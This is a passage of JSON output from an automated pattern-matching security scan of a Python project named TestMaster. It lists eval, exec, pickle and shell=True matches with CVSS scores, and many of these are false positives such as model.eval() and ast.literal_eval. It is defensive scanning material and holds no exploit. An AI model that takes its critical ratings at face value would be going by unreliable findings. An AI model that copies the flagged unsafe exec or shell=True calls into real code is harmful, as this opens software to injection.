      "context": "            \"optimizer_usage\": [\"optimizer.zero_grad\", \"optimizer.step\", \"loss.backward\"],\n            \"model_modes\": [\"model.train()\", \"model.eval()\", \"torch.no_grad()\"],\n            \"loss_computation\": [\"criterion(\", \"loss_fn(\", \"F.cross_entropy\", \"F.mse_loss\"]"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\ml_analysis\\ml_model_analyzer.py",
      "line": 116,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \n        # Missing model.train()/model.eval()\n        has_training_loop = any(pattern in content for pattern in [\"for epoch\", \"for batch\"])"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\ml_analysis\\ml_model_analyzer.py",
      "line": 118,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        has_training_loop = any(pattern in content for pattern in [\"for epoch\", \"for batch\"])\n        has_mode_setting = any(pattern in content for pattern in [\"model.train()\", \"model.eval()\"])\n        "
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\ml_analysis\\ml_model_analyzer.py",
      "line": 125,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                location=file_path,\n                description=\"Training loop without model.train()/model.eval()\",\n                recommendation=\"Set model mode with model.train() and model.eval()\","
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\ml_analysis\\ml_model_analyzer.py",
      "line": 126,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                description=\"Training loop without model.train()/model.eval()\",\n                recommendation=\"Set model mode with model.train() and model.eval()\",\n                framework=\"pytorch\","
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\ml_analysis\\ml_model_analyzer.py",
      "line": 285,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        # Check for proper evaluation mode\n        if \"model.eval()\" in content or \"torch.no_grad()\" in content:\n            self.training_patterns.append({"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\ml_analysis\\_shared_utils.py",
      "line": 241,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                        try:\n                            value = ast.literal_eval(node.value)\n                            hyperparams.append({"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\realtime_analysis\\realtime_ast_engine.py",
      "line": 838,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                            'severity': 'high',\n                            'message': 'Use of eval() detected',\n                            'line': node.lineno"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\realtime_analysis\\realtime_ast_engine.py",
      "line": 845,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                            'severity': 'high',\n                            'message': 'Use of exec() detected',\n                            'line': node.lineno"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\realtime_analysis\\realtime_ast_engine.py",
      "line": 13,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\security_monitoring\\continuous_security_monitor.py",
      "line": 116,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'name': 'Dangerous Function Usage',\n                'description': 'Detects usage of dangerous functions like eval() and exec()',\n                'pattern': r'\\b(eval|exec)\\s*\\(',"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\security_monitoring\\continuous_security_monitor.py",
      "line": 250,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                                f\"Replace {node.func.id}() with safer alternatives\",\n                                \"Use ast.literal_eval() for safe evaluation\",\n                                \"Implement proper input validation\""
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\security_monitoring\\continuous_security_monitor.py",
      "line": 116,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'name': 'Dangerous Function Usage',\n                'description': 'Detects usage of dangerous functions like eval() and exec()',\n                'pattern': r'\\b(eval|exec)\\s*\\(',"
    },
    {
      "file": "TestMaster\\archive\\architectural_decision_engine_original_2388_lines_20250821_130612.py",
      "line": 33,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from concurrent.futures import ThreadPoolExecutor, as_completed\nimport pickle\nimport yaml"
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 157,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"\n        Deep analysis of eval() and exec() usage\n        \"\"\""
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 188,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                                # Check for safe patterns\n                                if self._is_safe_eval(node):\n                                    eval_exec_analysis[\"safe_eval_patterns\"].append({"
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 220,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    \"pattern\": \"eval with user input\",\n                    \"suggestion\": \"Use ast.literal_eval() for safe evaluation of literals\",\n                    \"example\": \"ast.literal_eval(user_input)\""
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 221,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    \"suggestion\": \"Use ast.literal_eval() for safe evaluation of literals\",\n                    \"example\": \"ast.literal_eval(user_input)\"\n                },"
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 859,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"eval(user_input)\",\n                \"use\": \"ast.literal_eval(user_input)\","
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 860,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                \"instead_of\": \"eval(user_input)\",\n                \"use\": \"ast.literal_eval(user_input)\",\n                \"when\": \"Evaluating literals (strings, numbers, tuples, lists, dicts, booleans)\""
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 864,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"eval(expression)\",\n                \"use\": \"Custom parser or expression evaluator\","
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 869,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"eval(config_string)\",\n                \"use\": \"json.loads() or configparser\","
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 1153,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _is_safe_eval(self, node: ast.Call) -> bool:\n        \"\"\"Check if eval call is relatively safe\"\"\""
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 90,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"dynamic_execution\": self._analyze_dynamic_execution(),\n            \"eval_exec_usage\": self._analyze_eval_exec(),\n            \"import_security\": self._analyze_dynamic_imports(),"
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 155,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _analyze_eval_exec(self) -> Dict[str, Any]:\n        \"\"\""
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 157,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"\n        Deep analysis of eval() and exec() usage\n        \"\"\""
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 205,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                                \n                                if not self._is_safe_exec(node):\n                                    eval_exec_analysis[\"unsafe_patterns\"].append({"
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 878,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"exec(code_string)\",\n                \"use\": \"Function dispatch dictionary\","
    },
    {
      "file": "TestMaster\\archive\\from_subarchive_metaprogramming_analysis_original.py",
      "line": 1160,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _is_safe_exec(self, node: ast.Call) -> bool:\n        \"\"\"Check if exec call is relatively safe\"\"\""
    },
    {
      "file": "TestMaster\\archive\\placeholder_replacement_20250820_011704_predictive_analytics_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 157,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"\n        Deep analysis of eval() and exec() usage\n        \"\"\""
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 188,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                                # Check for safe patterns\n                                if self._is_safe_eval(node):\n                                    eval_exec_analysis[\"safe_eval_patterns\"].append({"
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 220,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    \"pattern\": \"eval with user input\",\n                    \"suggestion\": \"Use ast.literal_eval() for safe evaluation of literals\",\n                    \"example\": \"ast.literal_eval(user_input)\""
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 221,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    \"suggestion\": \"Use ast.literal_eval() for safe evaluation of literals\",\n                    \"example\": \"ast.literal_eval(user_input)\"\n                },"
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 859,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"eval(user_input)\",\n                \"use\": \"ast.literal_eval(user_input)\","
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 860,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                \"instead_of\": \"eval(user_input)\",\n                \"use\": \"ast.literal_eval(user_input)\",\n                \"when\": \"Evaluating literals (strings, numbers, tuples, lists, dicts, booleans)\""
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 864,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"eval(expression)\",\n                \"use\": \"Custom parser or expression evaluator\","
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 869,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"eval(config_string)\",\n                \"use\": \"json.loads() or configparser\","
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 1153,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _is_safe_eval(self, node: ast.Call) -> bool:\n        \"\"\"Check if eval call is relatively safe\"\"\""
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 90,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"dynamic_execution\": self._analyze_dynamic_execution(),\n            \"eval_exec_usage\": self._analyze_eval_exec(),\n            \"import_security\": self._analyze_dynamic_imports(),"
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 155,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _analyze_eval_exec(self) -> Dict[str, Any]:\n        \"\"\""
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 157,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"\n        Deep analysis of eval() and exec() usage\n        \"\"\""
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 205,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                                \n                                if not self._is_safe_exec(node):\n                                    eval_exec_analysis[\"unsafe_patterns\"].append({"
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 878,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            {\n                \"instead_of\": \"exec(code_string)\",\n                \"use\": \"Function dispatch dictionary\","
    },
    {
      "file": "TestMaster\\archive\\superseded_toplevel_metaprogramming_analysis.py",
      "line": 1160,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _is_safe_exec(self, node: ast.Call) -> bool:\n        \"\"\"Check if exec call is relatively safe\"\"\""
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_compressor.py",
      "line": 23,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import io\nimport pickle\n"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_dead_letter_queue.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_event_queue.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from enum import Enum\nimport pickle\nimport queue"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_export_manager.py",
      "line": 24,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from io import BytesIO, StringIO\nimport pickle\nimport base64"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_fallback_system.py",
      "line": 14,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_optimizer.py",
      "line": 162,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def optimize_data_retrieval(self, query_params: Dict[str, Any]) -> Optional[Any]:\n        \"\"\""
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_optimizer.py",
      "line": 15,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import zlib\nimport pickle\nfrom datetime import datetime, timedelta"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_persistence.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import zlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_redundancy.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport os"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_smart_cache.py",
      "line": 15,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\analytics_watchdog.py",
      "line": 448,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                command_line,\n                shell=True,\n                cwd=working_directory,"
    },
    {
      "file": "TestMaster\\archive\\centralization_process_20250821_intelligence_consolidation\\analytics_components\\predictive_analytics_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\archive\\integration_robust_duplicates_20250821_083109\\intelligent_caching_layer_robust.py",
      "line": 23,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\archive\\integration_robust_duplicates_20250821_083109\\predictive_analytics_engine_robust.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\archive\\legacy_scripts\\specialized_test_generators.py",
      "line": 787,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        \n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        results.append((name, result.returncode == 0))"
    },
    {
      "file": "TestMaster\\archive\\legacy_scripts\\testmaster_orchestrator.py",
      "line": 28,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\archive\\legacy_scripts\\week_5_8_batch_converter.py",
      "line": 29,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    print(\"Installing Google Gen AI SDK...\")\n    os.system(\"pip install google-generativeai\")\n    import google.generativeai as genai"
    },
    {
      "file": "TestMaster\\archive\\original_backup\\specialized_test_generators.py",
      "line": 787,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        \n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        results.append((name, result.returncode == 0))"
    },
    {
      "file": "TestMaster\\archive\\original_backup\\testmaster_orchestrator.py",
      "line": 28,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\archive\\original_backup\\week_5_8_batch_converter.py",
      "line": 29,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    print(\"Installing Google Gen AI SDK...\")\n    os.system(\"pip install google-generativeai\")\n    import google.generativeai as genai"
    },
    {
      "file": "TestMaster\\archive\\original_backup\\cache\\intelligent_cache.py",
      "line": 20,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import sqlite3\nimport pickle\nimport zlib"
    },
    {
      "file": "TestMaster\\archive\\original_backup\\config\\testmaster_config.py",
      "line": 542,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import ast\n            value = ast.literal_eval(value)\n        except:"
    },
    {
      "file": "TestMaster\\archive\\original_backup\\incremental\\dependency_tracker.py",
      "line": 25,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\n"
    },
    {
      "file": "TestMaster\\archive\\oversized_modules_20250821_042018\\coordination\\unified_workflow_orchestrator.py",
      "line": 27,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import yaml\nimport pickle\nimport sqlite3"
    },
    {
      "file": "TestMaster\\archive\\phase1c_consolidation_20250820_150000\\shared_state.py",
      "line": 12,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\archive\\phase1c_consolidation_20250820_150000\\integration\\intelligent_caching_layer.py",
      "line": 23,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\archive\\phase1c_consolidation_20250820_150000\\integration\\predictive_analytics_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\archive\\placeholder_backups_20250820_011745\\integration\\predictive_analytics_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\archive\\placeholder_backups_20250820_011817\\integration\\predictive_analytics_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\cache\\intelligent_cache.py",
      "line": 20,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import sqlite3\nimport pickle\nimport zlib"
    },
    {
      "file": "TestMaster\\config\\testmaster_config.py",
      "line": 542,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import ast\n            value = ast.literal_eval(value)\n        except:"
    },
    {
      "file": "TestMaster\\core\\framework_abstraction.py",
      "line": 139,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Execute the test\n            exec(code, namespace)\n            "
    },
    {
      "file": "TestMaster\\core\\framework_abstraction.py",
      "line": 379,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Execute the code\n            exec(code, namespace)\n            "
    },
    {
      "file": "TestMaster\\core\\framework_abstraction.py",
      "line": 421,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            for setup_code in self.setup:\n                exec(setup_code)\n            "
    },
    {
      "file": "TestMaster\\core\\framework_abstraction.py",
      "line": 431,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    exec(teardown_code)\n                except Exception as e:"
    },
    {
      "file": "TestMaster\\core\\shared_state.py",
      "line": 12,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\predictive_intelligence_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nfrom abc import ABC, abstractmethod"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\analytics\\predictive_analytics_engine.py",
      "line": 16,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport uuid"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\caching\\distributed_smart_cache.py",
      "line": 16,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\coordination\\unified_workflow_orchestrator_modules\\unified_workflow_orchestrator_part1.py",
      "line": 20,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import yaml\nimport pickle\nimport sqlite3"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\documentation\\api_spec_builder.py",
      "line": 76,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            for path, methods in matches:\n                methods_list = eval(f'[{methods}]') if methods else ['GET']\n                "
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\knowledge_graph\\instant_graph_engine.py",
      "line": 30,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport sqlite3"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\ml\\model_registry.py",
      "line": 11,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport hashlib"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\ml\\advanced\\smart_cache.py",
      "line": 14,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\orchestration\\workflow_orchestration_engine.py",
      "line": 330,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Evaluate simple conditions\n                result = eval(condition, {\"__builtins__\": {}}, context)\n            else:"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\orchestration\\workflow_orchestration_engine.py",
      "line": 677,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Simple condition evaluation (can be enhanced)\n            return eval(condition, {\"__builtins__\": {}}, context)\n        except Exception as e:"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\testing\\advanced\\ml_test_optimizer.py",
      "line": 6,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "\nimport pickle\nimport json"
    },
    {
      "file": "TestMaster\\core\\domains\\intelligence\\testing\\enterprise\\predictive_test_failure.py",
      "line": 8,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import time\nimport pickle\nfrom typing import Any, Dict, List, Optional, Set, Tuple, Union"
    },
    {
      "file": "TestMaster\\core\\domains\\security\\adaptive_fallback_orchestrator.py",
      "line": 15,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\domains\\security\\code_generation_security.py",
      "line": 318,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            \n            # Check for subprocess calls with shell=True\n            if isinstance(node.func, ast.Attribute) and node.func.attr in ['call', 'run', 'Popen']:"
    },
    {
      "file": "TestMaster\\core\\domains\\security\\code_generation_security.py",
      "line": 329,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                            code_snippet=code.split('\\n')[node.lineno - 1].strip() if node.lineno <= len(code.split('\\n')) else \"\",\n                            description=\"Subprocess call with shell=True\",\n                            recommendation=\"Use shell=False or validate inputs carefully\","
    },
    {
      "file": "TestMaster\\core\\domains\\security\\deployment_pipeline_security.py",
      "line": 471,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
